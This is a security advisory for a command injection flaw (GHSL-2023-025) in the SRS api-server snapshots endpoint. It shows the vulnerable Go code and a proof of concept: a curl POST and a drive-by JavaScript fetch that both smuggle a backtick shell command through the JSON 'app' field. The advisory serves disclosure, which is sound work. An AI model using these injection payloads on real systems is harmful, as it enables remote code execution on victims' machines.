## Details

### Issue: Command injection (`GHSL-2023-025`)

The `api-server` server is vulnerable to command injection. An attacker may send a request to the `/api/v1/snapshots` endpoint containing any commands to be executed as part of the body of the POST request. The handler for the [`/api/v1/snapshots`](https://github.com/ossrs/srs/blob/1d11d02e4b82fc3f37e4b048cff483b1581482c1/trunk/research/api-server/server.go#L761) endpoint is:

```
	http.HandleFunc("/api/v1/snapshots", func(w http.ResponseWriter, r *http.Request) {
		if r.Method != "POST" {
			SrsWriteDataResponse(w, struct{}{})
			return
		}

		if err := func() error {
			body, err := ioutil.ReadAll(r.Body)
			if err != nil {
				return fmt.Errorf("read request body, err %v", err)
			}
			log.Println(fmt.Sprintf("post to snapshots, req=%v", string(body)))

			msg := &SrsSnapShotRequest{}
			if err := json.Unmarshal(body, msg); err != nil {                           // [1]
				return fmt.Errorf("parse message from %v, err %v", string(body), err)
			}
			log.Println(fmt.Sprintf("Got %v", msg.String()))

			if msg.IsOnPublish() {
				sw.Create(msg)                                                          // [2]
			} else if msg.IsOnUnPublish() {
				sw.Destroy(msg)
			} else {
				return fmt.Errorf("invalid message %v", msg.String())
			}

			SrsWriteDataResponse(w, &SrsCommonResponse{Code: 0})
			return nil
		}(); err != nil {
			SrsWriteErrorResponse(w, err)
		}
	})
```

The body of the POST request is unmarshalled in `[1]` and passed to the `sw.Create` method. The `Create` method will craft a RTMP URL using untrusted data (e.g.: the `app` value from the JSON request):

```
func (v *SnapshotWorker) Create(sm *SrsSnapShotRequest) {
	streamUrl := fmt.Sprintf("rtmp://127.0.0.1/%v/%v?vhost=%v", sm.App, sm.Stream, sm.Vhost)
	if _, ok := v.snapshots.Load(streamUrl); ok {
		return
	}
	sj := NewSnapshotJob()
	sj.SrsSnapShotRequest = *sm
	sj.updatedAt = time.Now()
	go sj.Serve(v.ffmpegPath, streamUrl) // [3]
	v.snapshots.Store(streamUrl, sj)
}
```

The `streamUrl` is then passed to the `SnapshotJob.Serve()` method which, in turn, passes it to the `SnapshotWorker.do()` method where the `inputUrl` is interpolated into the `param` variable which is later executed as a shell command:

```
	param := fmt.Sprintf("%v -i %v -vf fps=1 -vcodec png -f image2 -an -y -vframes %v -y %v", ffmpegPath, inputUrl, v.vframes, normalPicPath)
	log.Println(fmt.Sprintf("start snapshot, cmd param=%v", param))
	timeoutCtx, _ := context.WithTimeout(v.cancelCtx, v.timeout)
	cmd := exec.CommandContext(timeoutCtx, "/bin/bash", "-c", param)
```

This issue was found by the [Command built from user-controlled sources](https://codeql.github.com/codeql-query-help/go/go-command-injection/) CodeQL query.

#### Impact

This issue may lead to Remote Code Execution (RCE).

#### Proof of concept

1. Start the `api-server`: `go run server.go`
2. Send the following request to the `/api/v1/snapshots` endpoint:

```
curl -i -s -k -X $'POST' \
    -H $'Host: localhost:8085' -H $'Connection: close' -H $'Content-Type: application/json' \
    --data-binary $'{\"action\":  \"on_publish\",\"app\":  \"`touch /tmp/pwned`\", \"stream\":\"foo\", \"vhost\": \"foo\",\"client_id\":\"foo\"}' \
    $'http://localhost:8085/api/v1/snapshots'

```

3. Check that a file named `pwned` will be created at `/tmp`

Note that even if port 8085 is only exposed on the localhost interface, an attacker may still be able to attack this service using what is known as a [drive-by attack](https://about.gitlab.com/blog/2021/09/07/why-are-developers-vulnerable-to-driveby-attacks/). For that purpose, an attacker can prepare a malicious site containing the following JS script:

```
<script>
	fetch("http://localhost:8085/api/v1/snapshots", {
        method: 'post',
        mode: 'no-cors',
        headers: {
            'Content-Type': 'text/plain'
        },
    	body: '{"action":  "on_publish", "app":  "`touch /tmp/pwned`", "stream":"foo", "vhost": "foo", "client_id":"foo"}',
	})
</script>
```

If the attacker fools the victim to visit this page while they have the `api-server` service running, they will be able to access and compromise the service remotely.

## GitHub Security Advisories

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.
